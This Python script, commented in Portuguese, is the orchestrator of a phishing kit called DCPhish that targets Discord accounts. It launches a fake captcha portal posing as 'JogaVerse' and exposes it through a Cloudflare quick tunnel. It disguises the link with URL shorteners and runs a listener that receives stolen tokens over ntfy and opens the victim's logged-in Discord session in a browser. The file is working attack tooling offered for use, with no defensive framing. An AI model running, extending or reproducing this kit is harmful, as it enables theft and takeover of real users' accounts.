#!/usr/bin/env python3
"""
DCPhish — orquestrador do kit completo.

Faz:
  1. Portal local (server.py) em http://127.0.0.1:8080
  2. Tunel Cloudflare (trycloudflare) -> link publico https
     (baixa o cloudflared automaticamente se faltar)
  3. Encurta o link (cleanuri, fallback spoo.me/ulvis)
  4. Listener ntfy (listener.py) -> abre o Discord logado no navegador

Uso:  python dcphish.py          (Ctrl+C encerra tudo)
"""
import json
import os
import re
import socket
import subprocess
import sys
import threading
import time
import urllib.parse
import urllib.request

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

from config import PORT

BASE = os.path.dirname(os.path.abspath(__file__))
PORTAL_URL = f"http://127.0.0.1:{PORT}"
CLOUDFLARED = os.path.join(BASE, "cloudflared.exe")

procs = []


def ensure_cloudflared():
    if os.path.exists(CLOUDFLARED):
        return True
    print("[tunel] baixando cloudflared...")
    try:
        urllib.request.urlretrieve(
            "https://github.com/cloudflare/cloudflared/releases/latest/"
            "download/cloudflared-windows-amd64.exe", CLOUDFLARED)
        return os.path.exists(CLOUDFLARED)
    except Exception as e:
        print("[tunel] download falhou:", repr(e)[:120])
        return False


def lan_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "localhost"


def portal_up():
    try:
        r = urllib.request.urlopen(PORTAL_URL + "/", timeout=3)
        return r.status == 200
    except Exception:
        return False


def proc_running(marker):
    try:
        out = subprocess.run(
            ["powershell", "-NoProfile", "-Command",
             "Get-CimInstance Win32_Process -Filter \"Name='python.exe'\" "
             "| Select-Object -ExpandProperty CommandLine"],
            capture_output=True, text=True, timeout=15)
        return marker in (out.stdout or "")
    except Exception:
        return False


def shorten(long_url):
    """Tenta varios encurtadores e DEVOLVE o primeiro link que funciona
    (verificado com um request real)."""
    candidates = []

    def try_get(url, data=None, headers=None, timeout=25):
        req = urllib.request.Request(url, data=data, headers=headers or {})
        return json.load(urllib.request.urlopen(req, timeout=timeout))

    try:
        j = try_get(
            "https://cleanuri.com/api/v1/shorten",
            data=urllib.parse.urlencode({"url": long_url}).encode(),
            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
        u = j.get("result_url")
        if u:
            candidates.append(u)
    except Exception:
        pass
    try:
        j = try_get(
            "https://spoo.me/",
            data=urllib.parse.urlencode({"url": long_url}).encode(),
            headers={"Accept": "application/json",
                     "Content-Type": "application/x-www-form-urlencoded"})
        u = j.get("short_url")
        if u:
            candidates.append(u)
    except Exception:
        pass
    try:
        j = try_get(
            "https://ulvis.net/api.php?url=" +
            urllib.parse.quote(long_url, safe="") + "&custom=&private=1")
        u = j.get("data", {}).get("url")
        if u:
            candidates.append(u)
    except Exception:
        pass

    for u in candidates:
        try:
            r = urllib.request.urlopen(
                urllib.request.Request(
                    u, headers={
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; "
                                      "x64) AppleWebKit/537.36 (KHTML, like "
                                      "Gecko) Chrome/124.0 Safari/537.36"}),
                timeout=25)
            final = r.geturl()
            body = r.read(300).decode("utf-8", "replace")
            if "trycloudflare" in final or "JogaVerse" in body:
                print(f"[encurtador] verificado: {u}")
                return u
        except Exception:
            continue
    return None


def spawn_with_tee(args, log_path, prefix):
    """Roda um subprocesso ecoando cada linha no console (com prefixo)
    e gravando no arquivo de log ao mesmo tempo."""
    f = open(os.path.join(BASE, log_path), "a", encoding="utf-8")
    p = subprocess.Popen(args, cwd=BASE, stdout=subprocess.PIPE,
                         stderr=subprocess.STDOUT, text=True,
                         encoding="utf-8", errors="replace", bufsize=1)
    procs.append(p)

    def reader():
        for line in p.stdout:
            line = line.rstrip()
            if line:
                f.write(line + "\n")
                f.flush()
                print(f"[{prefix}] {line}", flush=True)

    threading.Thread(target=reader, daemon=True).start()
    return p


def main():
    print("=" * 56)
    print("  DCPhish — iniciando...")
    print("=" * 56)

    # 1) portal
    if portal_up():
        print("[portal] ja ativo em", PORTAL_URL)
    else:
        print("[portal] iniciando servidor...")
        spawn_with_tee(
            ["python", "-u", os.path.join(BASE, "server.py")],
            "portal.log", "portal")
        for _ in range(40):
            if portal_up():
                print("[portal] ok:", PORTAL_URL)
                break
            time.sleep(0.5)
        else:
            print("[portal] FALHOU ao subir")
            sys.exit(1)

    # 2) listener ntfy
    if proc_running("listener.py"):
        print("[listener] ja ativo (ntfy -> navegador)")
    else:
        spawn_with_tee(
            ["python", "-u", os.path.join(BASE, "listener.py")],
            "listener.log", "listener")
        print("[listener] iniciado (ntfy -> navegador)")

    # 3) tunel cloudflare
    if not ensure_cloudflared():
        print("[tunel] sem cloudflared — link publico indisponivel")
        sys.exit(1)
    print("[tunel] abrindo Cloudflare...")
    p = subprocess.Popen(
        [CLOUDFLARED, "tunnel", "--no-autoupdate",
         "--url", f"http://localhost:{PORT}"],
        cwd=BASE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        text=True, encoding="utf-8", errors="replace")
    procs.append(p)

    public_url = None

    def reader():
        nonlocal public_url
        for line in p.stdout:
            line = line.strip()
            if "trycloudflare.com" in line:
                m = re.search(r"https://[a-z0-9-]+\.trycloudflare\.com", line)
                if m and not public_url:
                    public_url = m.group(0)

    threading.Thread(target=reader, daemon=True).start()
    for _ in range(60):
        if public_url:
            break
        time.sleep(0.5)
    if not public_url:
        print("[tunel] FALHOU ao obter URL publica")
        sys.exit(1)
    print("[tunel] URL publica:", public_url)
    # portal le este arquivo p/ montar o link do captcha via HTTPS
    with open(os.path.join(BASE, "tunnel_url.txt"), "w") as f:
        f.write(public_url)

    # 4) encurtar (opcional — alguns encurtadores sao sequestrados por
    #    DNS de operadora; o link direto do tunel SEMPRE funciona)
    short = shorten(public_url)

    print()
    print("=" * 56)
    print("  LINK PRONTO (funciona em qualquer rede):")
    print(f"    {public_url}")
    if short:
        print(f"  encurtado (pode falhar em rede movel): {short}")
    print("=" * 56)
    print(f"  local/LAN: http://{lan_ip()}:8080")
    print("  tunel:    ", public_url)
    print("  listener ntfy: ativo (token -> navegador logado)")
    print("  Ctrl+C encerra tudo")
    print()

    try:
        while True:
            time.sleep(5)
            if p.poll() is not None:
                print("[tunel] caiu — encerrando.")
                break
    except KeyboardInterrupt:
        pass
    finally:
        for pr in procs:
            try:
                pr.terminate()
            except Exception:
                pass
        print("[fim] processos encerrados.")


if __name__ == "__main__":
    main()
